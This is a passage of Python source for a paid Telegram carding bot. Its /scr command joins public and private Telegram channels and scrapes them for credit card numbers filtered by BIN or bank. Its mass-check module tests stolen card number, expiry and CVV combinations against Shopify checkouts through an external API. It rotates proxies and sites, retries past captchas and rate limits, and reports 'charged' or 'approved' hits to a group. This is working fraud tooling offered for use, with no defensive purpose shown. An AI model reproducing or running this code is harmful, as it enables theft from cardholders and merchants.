                f"<i>Upgrade your plan to remove the time limit.</i>",
                parse_mode=ParseMode.HTML
            )
            return
    
    # Parse command arguments
    args = context.args
    logger.info(f"Command arguments: {args}")
    
    if len(args) < 2:
        await update.message.reply_text(
            "⚠️ <b>Missing arguments!</b>\n\n"
            "<i>Usage: /scr [channel] [limit] [bin/bank]</i>\n"
            "<i>Example: /scr @channel 100 515462</i>\n"
            "<i>Example: /scr @channel 100 BankName</i>", 
            parse_mode=ParseMode.HTML
        )
        return
    
    # Get user credits BEFORE processing
    user_credits = get_user_credits(user_id)
    logger.info(f"User credits: {user_credits}")
    
    # Check if user has enough credits (or unlimited)
    is_unlimited = user_credits == float('inf')
    has_credits = user_credits is not None and (is_unlimited or user_credits > 0)
    
    # If user has no credits (and not unlimited), show warning and stop
    if not has_credits:
        await update.message.reply_text(
            f"""<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left.</i>

<a href='https://t.me/rev3rsex'>💳</a> <b>Please recharge to continue using this service.</b>

<a href='https://t.me/rev3rsex'>📊</a> <b>Current Plan:</b> <code>{user_tier}</code>
<a href='https://t.me/rev3rsex'>💰</a> <b>Credits:</b> <code>0</code>""",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Extract channel identifier
    channel_identifier = args[0]
    channel_id = None
    channel_name = "Unknown"
    channel_username = None
    
    logger.info(f"Processing channel identifier: {channel_identifier}")
    
    # Handle private channel chat ID (numeric)
    if channel_identifier.lstrip("-").isdigit():
        # Treat it as a chat ID
        try:
            # Fetch the chat details using python-telegram-bot
            chat = await context.bot.get_chat(channel_identifier)
            channel_name = chat.title
            channel_id = int(channel_identifier)
            channel_username = chat.username  # Get the username if available
            logger.info(f"Successfully resolved chat ID: {channel_id}, name: {channel_name}, username: {channel_username}")
        except Exception as e:
            logger.error(f"Error resolving chat ID {channel_identifier}: {str(e)}")
            await update.message.reply_text(f"<b>Invalid chat ID ❌</b>\n\n<code>{html.escape(str(e))}</code>")
            return
    else:
        # Handle public channels or private invite links
        if channel_identifier.startswith("https://t.me/+"):
            # Private invite link
            invite_link = channel_identifier
            try:
                if PYROGRAM_AVAILABLE and user_client:
                    # Fix: Wrap join_chat to specifically catch UserAlreadyParticipant
                    try:
                        await user_client.join_chat(invite_link)
                    except UserAlreadyParticipant:
                        logger.info(f"Already a participant in the chat: {invite_link}")
                    except InviteRequestSent:
                        logger.info(f"Join request sent to the chat: {invite_link}")
                    
                    # Attempt to get chat details (works if we are joined or just requested)
                    chat = await user_client.get_chat(invite_link)
                    channel_name = chat.title
                    channel_id = chat.id
                    channel_username = chat.username
                    logger.info(f"Successfully processed private channel: {channel_name}, ID: {channel_id}, username: {channel_username}")
                else:
                    # Fallback if Pyrogram is not available
                    try:
                        await context.bot.join_chat(invite_link)
                    except BadRequest as e:
                        if "USER_ALREADY_PARTICIPANT" in str(e):
                            logger.info(f"Bot already a participant in the chat: {invite_link}")
                        else:
                            raise
                    
                    chat = await context.bot.get_chat(invite_link)
                    channel_name = chat.title
                    channel_id = chat.id
                    channel_username = chat.username
                    logger.info(f"Successfully processed private channel: {channel_name}, ID: {channel_id}, username: {channel_username}")
            except Exception as e:
                # This catches actual critical errors (e.g. InviteHashExpired)
                logger.error(f"Error joining private channel {invite_link}: {str(e)}")
                await update.message.reply_text(f"<b>Failed to join private channel ❌</b>\n\n<code>{html.escape(str(e))}</code>")
                return
        elif channel_identifier.startswith("https://t.me/"):
            # Remove "https://t.me/" for regular links
            channel_username = channel_identifier[13:]
        elif channel_identifier.startswith("t.me/"):
            # Remove "t.me/" for short links
            channel_username = channel_identifier[5:]
        else:
            # Assume it's already a username
            channel_username = channel_identifier

        if channel_id is None:
            # Ensure the username starts with @ for the API
            if not channel_username.startswith("@"):
                channel_username = "@" + channel_username
                
            logger.info(f"Attempting to get chat with username: {channel_username}")
            
            try:
                # Fetch the chat details using python-telegram-bot
                chat = await context.bot.get_chat(channel_username)
                channel_name = chat.title
                channel_id = chat.id
                channel_username = chat.username
                logger.info(f"Successfully resolved channel: {channel_name}, ID: {channel_id}, username: {channel_username}")
            except Exception as e:
                logger.error(f"Error resolving channel {channel_username}: {str(e)}")
                await update.message.reply_text(f"<b>Incorrect username or chat ID ❌</b>\n\n<code>{html.escape(str(e))}</code>")
                return
    
    # Extract limit (second argument)
    try:
        limit = int(args[1])
        logger.info(f"Limit set to: {limit}")
    except ValueError:
        logger.error(f"Invalid limit value: {args[1]}")
        await update.message.reply_text(
            "<b>⚠️ Invalid limit value ❌</b>\n\n"
            "<i>Please provide a valid number for the limit parameter.</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Enforce maximum limit based on user tier
    max_limit = PREMIUM_LIMIT if user_tier != "Free" and user_tier != "Trial" else DEFAULT_LIMIT
    if limit > max_limit:
        await update.message.reply_text(
            f"<b>⚠️ Maximum limit exceeded ❌</b>\n\n"
            f"<i>Your current plan allows a maximum of {max_limit} cards.</i>\n"
            f"<i>Please reduce your limit or upgrade your plan.</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Extract optional filter (third argument)
    bin_filter = None
    bank_filter = None
    if len(args) > 2:
        # Check if the third argument is a BIN number (digits only)
        if args[2].isdigit():
            bin_filter = args[2]
            logger.info(f"BIN filter applied: {bin_filter}")
        else:
            # Otherwise, treat it as a bank name
            bank_filter = " ".join(args[2:])
            logger.info(f"Bank filter applied: {bank_filter}")
    
    # Create progress message with proper clickable bullets
    progress_msg = f"""<pre><b>𝗦𝗰𝗿𝗮𝗽𝗶𝗻𝗴 𝗜𝗻 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀...</b></pre>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝑺𝒐𝒖𝒓𝒄𝒆</b> ↬ <code>{channel_name}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝑳𝒊𝒎𝒊𝒕</b> ↬ <code>{limit}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝑭𝒊𝒍𝒕𝒆𝒓</b> ↬ <code>{bin_filter or bank_filter or 'None'}</code>"""
    
    # Send the progress message
    scraping_message = await update.message.reply_text(progress_msg, parse_mode=ParseMode.HTML)
    logger.info(f"Sent progress message to user {user_id}")
    
    # Prepare user info
    user_info = {
        "id": user_id,
        "username": username,
        "first_name": first_name
    }
    
    # Update the last command time for Free/Trial users immediately
    if user_tier in ["Trial", "Free"]:
        last_command_time[user_id] = current_time
        logger.info(f"Updated last command time for user {user_id}")
    
    # Create a background task for the scraping to avoid blocking
    async def background_scrape():
        try:
            logger.info(f"Starting background scraping for channel {channel_id} with limit {limit}")
            
            # Check if Pyrogram is available and connected
            if not PYROGRAM_AVAILABLE or not user_client or not user_client.is_connected:
                raise RuntimeError("Scraping service is unavailable. Pyrogram client is not running.")
            
            # Use Pyrogram for scraping - pass the username, not the numeric ID
            pyrogram_channel_identifier = channel_username if channel_username else str(channel_id)
            scrapped_results = await scrape_messages(
                user_client, 
                pyrogram_channel_identifier, 
                limit, 
                start_number=bin_filter, 
                bank_name=bank_filter
            )
            unique_cards, duplicates_removed = remove_duplicates(scrapped_results)
            
            logger.info(f"Found {len(unique_cards)} unique cards, removed {duplicates_removed} duplicates")
            
            # Prepare results
            results = {
                "success": True if unique_cards else False,
                "cards_found": len(unique_cards),
                "duplicates_removed": duplicates_removed,
                "source": channel_name,
                "bin_filter": bin_filter or "",
                "bank_filter": bank_filter or ""
            }
            
            # If cards were found, create a file with the results
            if unique_cards:
                file_name = f"x{len(unique_cards)}_{channel_name.replace(' ', '_')}.txt"
                logger.info(f"Creating file with results: {file_name}")
                
                # Use aiofiles for asynchronous file writing
                async with aiofiles.open(file_name, mode='w') as f:
                    await f.write("\n".join(unique_cards))
                
                # Use aiofiles for asynchronous file reading
                async with aiofiles.open(file_name, mode='rb') as f:
                    # Deduct credits based on config if the response was successful and user doesn't have unlimited credits
                    if not is_unlimited:
                        update_user_credits(user_id, -CREDIT_COST)
                        logger.info(f"Deducted {CREDIT_COST} credits from user {user_id}")
                        
                        # Get updated credits for the response
                        updated_credits = get_user_credits(user_id)
                        logger.info(f"Updated user credits: {updated_credits}")
                        
                        # Add warning if credits are now 0
                        if updated_credits is not None and updated_credits <= 0:
                            results["credits_warning"] = True
                    
                    # Format the response
                    formatted_response = format_scr_response(results, user_info)
                    
                    # Send the file with caption
                    await context.bot.send_document(
                        update.effective_chat.id,
                        document=file_name,
                        caption=formatted_response,
                        parse_mode=ParseMode.HTML
                    )
                    logger.info(f"Sent results file to user {user_id}")
                
                # Remove the file
                os.remove(file_name)
                logger.info(f"Removed temporary file: {file_name}")
                
                # Delete the scraping message
                await scraping_message.delete()
                logger.info(f"Deleted progress message")
            else:
                # No cards found
                results["success"] = False
                results["error"] = "No credit cards found"
                formatted_response = format_scr_response(results, user_info)
                await safe_edit_message(
                    context=context,
                    chat_id=update.effective_chat.id,
                    message_id=scraping_message.message_id,
                    text=formatted_response,
                    parse_mode=ParseMode.HTML
                )
                logger.info(f"No cards found, updated message with error")
        
        except RuntimeError as e:
            logger.error(f"Pyrogram not available: {str(e)}")
            error_msg = f"⚠️ <b>Scraper offline</b>\n<code>{html.escape(str(e))}</code>"
            await safe_edit_message(
                context=context,
                chat_id=update.effective_chat.id,
                message_id=scraping_message.message_id,
                text=error_msg,
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            logger.error(f"Error in background scraping: {str(e)}", exc_info=True)
            error_msg = f"⚠️ <b>Error:</b> <code>{html.escape(str(e))}</code>"
            await safe_edit_message(
                context=context,
                chat_id=update.effective_chat.id,
                message_id=scraping_message.message_id,
                text=error_msg,
                parse_mode=ParseMode.HTML
            )
    
    # Schedule the background task without awaiting it
    asyncio.create_task(background_scrape())
    logger.info(f"Background scraping task created for user {user_id}")

# Function to initialize Pyrogram client
async def initialize_pyrogram():
    """Initialize the Pyrogram client for scraping"""
    if PYROGRAM_AVAILABLE and user_client:
        try:
            # Start the client with timeout
            await user_client.start()
            logger.info("Pyrogram client started successfully")
            return True
        except Exception as e:
            logger.error(f"Failed to start Pyrogram client: {e}")
            logger.error(f"Error details: {str(e)}")
            logger.error(f"Session string length: {len(SESSION_STRING)}")
            return False
    return False

# Function to stop Pyrogram client
async def stop_pyrogram():
    """Stop the Pyrogram client"""
    if PYROGRAM_AVAILABLE and user_client:
        try:
            await user_client.stop()
            logger.info("Pyrogram client stopped successfully")
        except Exception as e:
            logger.error(f"Failed to stop Pyrogram client: {e}")

# Export the necessary functions
__all__ = [
    'handle_scr_command',
    'initialize_pyrogram',
    'stop_pyrogram'
]



# ============================================================
# MODULE: msh
# ============================================================
# Configure logging with detailed output for debugging

# New API endpoint
API_BASE_URL = SHOPIFY_MASS_API_URL

# Group IDs for hit detection notifications
HIT_DETECTION_GROUP_ID = -1003518846194

# --- ANTI-FLOOD CONTROLS ---
# Limit concurrent sends to public groups to prevent Telegram ban
# Allow only 2 simultaneous messages to groups to be extremely safe
group_send_limiter = asyncio.Semaphore(2)

# --- GLOBAL STATE ---
# Dictionary to store active mass check processes
active_mass_checks = {}
# Dictionary to track pending mass check confirmations
pending_mass_checks = {}
# Dictionary to track problematic sites (r4 token empty)
problematic_sites = {
    "r4_token_empty": [],  # Sites returning "r4 token empty" error
    "item_response": [],   # Sites returning "item" in response
    "proxy_errors": [],   # Sites with proxy errors
    "host_errors": [],    # Sites with host resolution errors
    "last_reset": time.time()  # Timestamp of last reset
}

# Error messages that trigger a retry with another site
RETRY_ERRORS = [
    'r4 token empty',
    'Payment method is not shopify!',
    'r2 id empty',
    'product not found',    
    'hcaptcha detected',
    'tax ammount empty',
    'del ammount empty',
    'product id is empty',
    'py id empty',
    'clinte token',
    'HCAPTCHA_DETECTED',
    'RECEIPT_EMPTY',
    'NA',
    'Site Error! Status: 429',
    'Site requires login!',
    'Failed to get token',
    'Failed to get token',
    'No Valid Products',
    'Not Shopify!',
    'Site Error! Status: 404',
    'Site Error! Status: 401',
    'Site Error! Status: 402',
    'Failed to get checkout',
    'Captcha at Checkout - Use good proxies!',
    'Payment method is not shopify!',
    'Site not supported for now!',
    'Connection error',
    'Connection Error!',
    'Error processing card',
    '504',
    'server error',
    'client error',
    'failed',
    'AMOUNT_TOO_SMALL',
    'Change Proxy or Site',
    'receipt_empty',
    'amount_too_small',
    'HCAPTCHA_DETECTED',
    'Token Not Found',
    'INVALID_RESPONSE',
    'resolve',
    
    'item',  # Added 'item' to trigger site rotation
    'cURL error',  # Added cURL errors
    'Could not resolve host',  # Added host resolution errors
    'CONNECT tunnel failed',  # Added proxy tunnel errors
]

def msh_generate_session_id(length=8):
    """Generate a random session ID."""
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def msh_luhn_check(card_number: str) -> bool:
    """
    Validate a card number using Luhn algorithm.
    
    Args:
        card_number: The card number to validate
        
    Returns:
        True if card number is valid, False otherwise
    """
    # Remove any non-digit characters
    card_number = re.sub(r'\D', '', card_number)
    
    # Check if card number contains only digits and has a valid length
    if not card_number.isdigit() or len(card_number) < 13 or len(card_number) > 19:
        return False
    
    # Convert to list of integers
    digits = [int(d) for d in card_number]
    
    # Double every second digit from right
    for i in range(len(digits) - 2, -1, -2):
        digits[i] *= 2
        if digits[i] > 9:
            digits[i] -= 9
    
    # Sum all digits
    total = sum(digits)
    
    # Check if sum is divisible by 10
    return total % 10 == 0

def reset_problematic_sites():
    """Reset problematic sites list if it's been more than 30 minutes."""
    current_time = time.time()
    if current_time - problematic_sites["last_reset"] > 1800:  # 30 minutes
        problematic_sites["r4_token_empty"] = []
        problematic_sites["item_response"] = []
        problematic_sites["proxy_errors"] = []
        problematic_sites["host_errors"] = []
        problematic_sites["last_reset"] = current_time
        logger.info("Reset problematic sites list")

def get_random_site(user_id: int) -> str:
    """
    Get a random site for user, excluding problematic ones.
    
    Args:
        user_id: ID of the user
        
    Returns:
        Random site URL
    """
    # Reset problematic sites if needed
    reset_problematic_sites()
    
    # Get user sites
    user_sites = get_user_sites(user_id)
    
    # If user has no sites, return None (will be handled by caller)
    if not user_sites:
        logger.warning(f"User {user_id} has no sites configured")
        return None
    
    # Filter out sites with known errors
    available_sites = [site for site in user_sites 
                      if site not in problematic_sites["r4_token_empty"] 
                      and site not in problematic_sites["item_response"]
                      and site not in problematic_sites["proxy_errors"]
                      and site not in problematic_sites["host_errors"]]
    
    # If all sites are problematic, reset the list and use all sites
    if not available_sites:
        logger.warning("All sites are marked as problematic, resetting list")
        problematic_sites["r4_token_empty"] = []
        problematic_sites["item_response"] = []
        problematic_sites["proxy_errors"] = []
        problematic_sites["host_errors"] = []
        available_sites = user_sites
    
    return random.choice(available_sites)

def mark_problematic_site(site: str, error_type: str):
    """Mark a site as problematic based on error type."""
    if error_type == "r4 token empty" and site not in problematic_sites["r4_token_empty"]:
        problematic_sites["r4_token_empty"].append(site)
        logger.warning(f"Marked site as problematic for 'r4 token empty': {site}")
    elif error_type == "item" and site not in problematic_sites["item_response"]:
        problematic_sites["item_response"].append(site)
        logger.warning(f"Marked site as problematic for 'item' response: {site}")
    elif error_type == "proxy" and site not in problematic_sites["proxy_errors"]:
        problematic_sites["proxy_errors"].append(site)
        logger.warning(f"Marked site as problematic for proxy errors: {site}")
    elif error_type == "host" and site not in problematic_sites["host_errors"]:
        problematic_sites["host_errors"].append(site)
        logger.warning(f"Marked site as problematic for host errors: {site}")

def is_retry_error(response_text: str) -> Tuple[bool, str]:
    """
    Check if response text contains any retry error and identify error type.
    IMPROVEMENT: Strips HTML tags before checking for errors to be more robust.
    CHANGE: Now treats "Error processing card" as a final declined response, not a retryable error.
    CHANGE: Now treats "CAPTCHA_REQUIRED" as a declined response, not a retryable error.
    
    Args:
        response_text: The response text to check
        
    Returns:
        Tuple of (is_retry_error, error_type)
    """
    # Strip HTML tags from response text before checking for errors
    # This handles cases like '<b>Error processing card</b>' correctly
    clean_text = re.sub(r'<[^>]+>', '', response_text)
    response_text_lower = clean_text.lower()
    
    # Check if this is "Error processing card" - treat as declined, not a retry error
    if "error processing card" in response_text_lower:
        return False, "declined"
    
    # Check if this is "CAPTCHA_REQUIRED" - treat as declined, not a retry error
    if "captcha_required" in response_text_lower or "captcha required" in response_text_lower:
        return False, "declined"
    
    for error in RETRY_ERRORS:
        if error.lower() in response_text_lower:
            # Determine error type for tracking
            if "cURL error" in response_text_lower and "CONNECT tunnel failed" in response_text_lower:
                return True, "proxy"
            elif "Could not resolve host" in response_text_lower:
                return True, "host"
            elif error.lower() == "r4 token empty":
                return True, "r4 token empty"
            elif error.lower() == "item":
                return True, "item"
            else:
                return True, "other"
    return False, ""

async def check_single_card(card_details: str, user_info: Dict, user_proxies: List[str], 
                         proxy_index: int = 0, max_retries: int = 25, 
                         stop_event: asyncio.Event = None, session_id: str = None) -> Dict:
    """
    Check a single card using Shopify API with retry logic (pure async version).
    Continues retrying until a valid response is received or max_retries is reached.
    
    Args:
        card_details: String containing card details in various formats
        user_info: Dictionary containing user information
        user_proxies: List of user's proxies
        proxy_index: Index of proxy to use (for rotation)
        max_retries: Maximum number of retries with different sites
        stop_event: Event to signal when to stop checking
        session_id: Session ID for this mass check process
        
    Returns:
        Dictionary with API response and site used
    """
    # Parse card details
    parsed = msh_parse_card_details(card_details)
    if not parsed:
        return {
            "success": False,
            "error": "Invalid card format",
            "card": card_details,
            "is_proxy_error": False
        }
    
    card_number, month, year, cvv = parsed
    user_id = user_info.get("id")
    
    # Check if card number is valid using Luhn algorithm
    if not msh_luhn_check(card_number):
        return {
            "success": False,
            "error": "Invalid card number (failed Luhn check)",
            "card": card_details,
            "is_proxy_error": False,
            "is_luhn_failed": True
        }
    
    # Get BIN information using imported function
    try:
        bin_details = await get_bin_info(card_number[:6])
    except Exception as e:
        bin_details = {}
    
    brand = (bin_details.get("scheme") or "N/A").title()
    issuer = bin_details.get("bank") or "N/A"
    country_name = bin_details.get("country") or "Unknown"
    country_flag = bin_details.get("country_emoji", "")
    
    # Check if stopped before starting - IMMEDIATE CHECK
    if stop_event and stop_event.is_set():
        return {
            "success": False,
            "error": "Process stopped by user",
            "card": card_details,
            "is_proxy_error": False
        }
    
    # Get a proxy from user's list using the provided index
    if not user_proxies:
        logger.error(f"No proxy found for user {user_id}")
        return {
            "success": False,
            "error": "No proxy found. Please add a proxy using /proxy command.",
            "card": card_details,
            "is_proxy_error": True
        }
    
    # Track used sites to avoid repetition
    used_sites = set()
    
    # Try up to max_retries times with different sites
    for attempt in range(max_retries):
        # Check if user has requested to stop - check more frequently
        if stop_event and stop_event.is_set():
            return {
                "success": False,
                "error": "Process stopped by user",
                "card": card_details,
                "is_proxy_error": False
            }
        
        # Get a random site for each attempt, avoiding problematic sites
        site = get_random_site(user_id)
        
        # If no sites available, return error
        if site is None:
            return {
                "success": False,
                "error": "No sites configured. Please add sites using /seturl command.",
                "card": card_details,
                "is_proxy_error": False
            }
        
        # Skip if we've already used this site
        if site in used_sites:
            continue
        
        used_sites.add(site)
        
        # Rotate proxy for each retry attempt - ensure we're rotating properly
        # Use a global proxy counter to ensure proper rotation across all cards
        global_proxy_index = proxy_index + attempt
        proxy = user_proxies[global_proxy_index % len(user_proxies)]
        
        # Remove http:// or https:// from proxy if present
        if proxy.startswith("http://"):
            proxy = proxy[7:]
        elif proxy.startswith("https://"):
            proxy = proxy[8:]
        
        # Prepare API URL with query parameters
        api_url = f"{API_BASE_URL}?cc={card_number}|{month}|{year}|{cvv}&url={site}&proxy="
        
        # Logging removed for console cleanliness
        
        try:
            # Add 0.2 second delay before each request
            await asyncio.sleep(0.3)
            
            # Use aiohttp for async HTTP request with timeout
            timeout = aiohttp.ClientTimeout(total=60)  # Increased timeout
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(api_url) as response:
                    if response.status >= 500:
                        continue
                    
                    api_response = await response.json()
                    
                    # Check if we got a valid response (not a retry error)
                    response_text = api_response.get("Response", "")
                    
                    # Check for specific error messages that should trigger retry
                    is_retry, error_type = is_retry_error(response_text)
                    
                    # If it's "Error processing card", treat as declined and return immediately
                    if error_type == "declined":
                        return {
                            "success": True,
                            "api_response": api_response,
                            "site": site,
                            "card": card_details,
                            "brand": brand,
                            "issuer": issuer,
                            "country": country_name,
                            "country_flag": country_flag,
                            "is_proxy_error": False,
                            "proxy_status": api_response.get("Proxy", "N/A")
                        }
                    
                    if is_retry:
                        # Mark site as problematic based on error type
                        mark_problematic_site(site, error_type)
                        continue
                    
                    # Check if price is above $150, if so, retry with another site
                    price = api_response.get("Price", "0")
                    try:
                        price_value = float(price.replace("$", ""))
                        if price_value > 150:
                            continue  # Skip this site and try another
                    except (ValueError, AttributeError):
                        # If we can't parse price, continue with this response
                        pass
                    
                    # If we get here, we have a valid response
                    # Get proxy status from response
                    proxy_status = api_response.get("Proxy", "Unknown")
                    
                    return {
                        "success": True,
                        "api_response": api_response,
                        "site": site,
                        "card": card_details,
                        "brand": brand,
                        "issuer": issuer,
                        "country": country_name,
                        "country_flag": country_flag,
                        "is_proxy_error": False,
                        "proxy_status": proxy_status
                    }
        
        except asyncio.TimeoutError:
            continue
        except aiohttp.ClientError:
            continue
        except ValueError:
            continue
        except Exception:
            continue
    
    # If we get here, all retries failed - count as error instead of declined
    return {
        "success": False,
        "error": "All retries failed",
        "card": card_details,
        "is_proxy_error": False
    }

def msh_parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    """
    Parse card details from various formats.
    
    Args:
        card_string: String containing card details in various formats
        
    Returns:
        Tuple of (card_number, month, year, cvv) or None if parsing failed
    """
    # Remove any extra spaces
    card_string = card_string.strip()
    
    # Try different patterns
    patterns = [
        # Pattern: 429619000071410|08|30|545
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 429619000071410/08/30/545
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 429619000071410:08:30:545
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 42961900071410 08 30 545
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
    ]
    
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return card_number, month, year, cvv
    
    return None

def format_mass_response(result: Dict, user_info: Dict) -> Tuple[str, str]:
    """
    Format API response into a beautiful message with emojis for Shopify.
    
    Args:
        result: Dictionary containing API response
        user_info: Dictionary containing user information
        
    Returns:
        Tuple of (formatted string, status category)
    """
    if not result.get("success"):
        error_msg = result.get('error', 'Unknown error')
        
        # Check if this is a Luhn check failure
        if result.get("is_luhn_failed"):
            formatted_error = f"❌ <i>Declined</i> <code>{result.get('card', 'Unknown')}</code>: Invalid card number (failed Luhn check)"
            return formatted_error, "declined"
        # Check if this is a proxy error
        elif result.get("is_proxy_error"):
            formatted_error = f"⚠️ <i>Proxy Error</i> <code>{result.get('card', 'Unknown')}</code>: {error_msg}"
            return formatted_error, "proxy_error"
        # Check if this is a declined card (after max retries)
        elif error_msg == "card_declined":
            formatted_error = f"❌ <i>Declined</i> <code>{result.get('card', 'Unknown')}</code>: Card declined after maximum retries"
            return formatted_error, "declined"
        else:
            formatted_error = f"⚠️ <i>Error checking card</i> <code>{result.get('card', 'Unknown')}</code>: {error_msg}"
            return formatted_error, "error"
    
    api_response = result.get("api_response", {})
    card_details = result.get("card", "")
    brand = result.get("brand", "N/A")
    issuer = result.get("issuer", "N/A")
    country_name = result.get("country", "Unknown")
    country_flag = result.get("country_flag", "")
    site = result.get("site", "")
    proxy_status = result.get("proxy_status", "Unknown")
    
    response_text = api_response.get("Response", "N/A")
    gateway = api_response.get("Gate", "Shopify")
    price = api_response.get("Price", "N/A")
    status = api_response.get("Status", False)
    
    # Parse and clean response message
    response_text = response_text.replace("\\", "").replace("/", "").replace("\"", "").replace("'", "")
    
    # Determine status based on message content with stylish formatting
    status_emoji = "❓"
    status_text = "Unknown"
    status_style = ""
    status_category = "unknown"
    
    # Check for charged messages (ONLY ORDER_PLACED should be considered charged)
    response_text_lower = response_text.lower()
    if "order_paid" in response_text_lower:
        status_emoji = "🔥"
        status_text = "Charged"
        status_style = "𝘾𝙝𝙖𝙧𝙜𝙚𝙙 🔥"
        status_category = "charged"
    # Check for approved messages (including 3DS_REQUIRED)
    elif any(keyword in response_text_lower for keyword in ["3d_authentication", "insufficient_funds", "incorrect_zip", "3ds_required", "invalid_cvc"]):
        status_emoji = "✅"
        status_text = "Approved"
        status_style = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
        status_category = "approved"
    # Check for declined messages (including "Error processing card", "CAPTCHA_REQUIRED", and "CARD_DECLINED")
    # CHANGE: Added 'error processing card', 'captcha_required', and 'card_declined' to this check to categorize them as "declined"
    elif ("card_declined" in response_text_lower or 
          "generic_error" in response_text_lower or
          "do not honor" in response_text_lower or
          "insufficient funds" in response_text_lower or
          "lost or stolen" in response_text_lower or
          "stolen" in response_text_lower or
          "token" in response_text_lower or
          "unable" in response_text_lower or
          "expired" in response_text_lower or
          "invalid" in response_text_lower or
          "generic" in response_text_lower or
          "incorrect_number" in response_text_lower or
          "unprocessable_transaction" in response_text_lower or
          "error processing card" in response_text_lower or  # This is the key change
          "backbend_high" in response_text_lower or  # Added CAPTCHA_REQUIRED as declined
          "server_overloaded" in response_text_lower):  # Added space variant
        status_emoji = "❌"
        status_text = "Declined"
        status_style = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌"
        status_category = "declined"
    # Default status
    else:
        status_emoji = "❓"
        status_text = "Unknown"
        status_style = f"{status_emoji} 𝙐𝙣...𝙠"
        status_category = "unknown"
    
    # Get user info
    user_id = user_info.get("id", "Unknown")
    username = user_info.get("username", "")
    first_name = user_info.get("first_name", "User")
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Format response with new UI structure
    status_part = f"<pre>⩙ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬ {status_style}</pre>"
    
    card_part = f"<a href='https://t.me/rev3rsex'>⊀</a> 𝐂𝐚𝐫𝐝\n⤷ <code>{card_details}</code>"
    
    gateway_part = f"<a href='https://t.me/rev3rsex'>⊀</a> 𝐆𝚊𝐭𝐞𝐰𝚊𝐲 ↬ <i><b>{gateway}</b></i>"
    
    response_part = f"<a href='https://t.me/rev3rsex'>⊀</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↬ <b>{response_text}</b>"
    
    price_part = f"<a href='https://t.me/rev3rsex'>⊀</a> 𝐏𝐫𝐢𝐜𝐞 ↬ <b>{price} USD</b>"
    
    bank_part = f"<pre>𝑩𝒓𝒂𝒏𝒌 ↬ <code>{brand}</code>\n𝑩𝒂𝒏𝒌 ↬ <code>{issuer}</code>\n𝑪𝒐𝒖𝒏𝒕𝒓𝒚 ↬ <code>{country_name} {country_flag}</code></pre>"
    
    user_part = f"<a href='https://t.me/rev3rsex'>⌬</a> 𝐔𝐬𝐞𝐫 ↬ <a href='tg://user?id={user_id}'>{first_name}</a> <code>[{user_tier}]</code>"
    
    proxy_emoji = "🟢" if proxy_status.lower() == "live" else "🔴"
    proxy_part = f"<a href='https://t.me/rev3rsex'>⌬</a> 𝐏𝐱 ↬ {proxy_emoji}"    
    
    # Add developer part with hyperlink
    dev_part = f"<a href='https://t.me/rev3rsex'>⌬</a> 𝐃𝐞𝐯 ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a> / {proxy_part}"
    
    # Combine all parts
    formatted_response = f"{status_part}\n{card_part}\n{gateway_part}\n{response_part}\n{price_part}\n{bank_part}\n{user_part}\n{dev_part}"
    
    return formatted_response, status_category

def msh_format_hit_detected_message(result: Dict, user_info: Dict) -> str:
    """
    Format a hit detection message for group chat using UI from second script.
    
    Args:
        result: Dictionary containing API response
        user_info: Dictionary containing user information
        
    Returns:
        Formatted string for hit detection message
    """
    api_response = result.get("api_response", {})
    card_details = result.get("card", "")
    site = result.get("site", "")
    
    response_text = api_response.get("Response", "N/A")
    gateway = api_response.get("Gate", "Shopify")
    price = api_response.get("Price", "N/A")
    
    # Parse and clean response message
    response_text = response_text.replace("\\", "").replace("/", "").replace("\"", "").replace("'", "")
    
    # Get user info
    user_id = user_info.get("id", "Unknown")
    username = user_info.get("username", "")
    first_name = user_info.get("first_name", "User")
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Create user profile link
    user_link = f"<a href='tg://user?id={user_id}'>{first_name}</a> <code>[{user_tier}]</code>"
    
    # Determine status based on message content - ONLY ORDER_PLACED should be considered charged
    response_text_lower = response_text.lower()
    if "order_paid" in response_text_lower:
        status_style = "<b>𝘾𝙝𝙖𝙧𝙜𝙚𝙙</b> 🔥"
    elif any(keyword in response_text_lower for keyword in ["3d_authentication", "invalid_cvc", "insufficient_funds", "incorrect_zip", "3ds_required"]):
        status_style = "<b>𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿</b> ✅"
    else:
        status_style = "<b>𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿</b> ❌"
    
    # Format hit detection message with UI style from second script
    status_part = f"""<pre><a href='https://t.me/rev3rsex'>⩙</a> <b>𝑯𝒊𝒕 𝑫𝒆𝒕𝒄𝒕𝒆𝒅</b> ↬ {status_style}</pre>"""
    
    # Combine all parts
    hit_message = f"""{status_part}
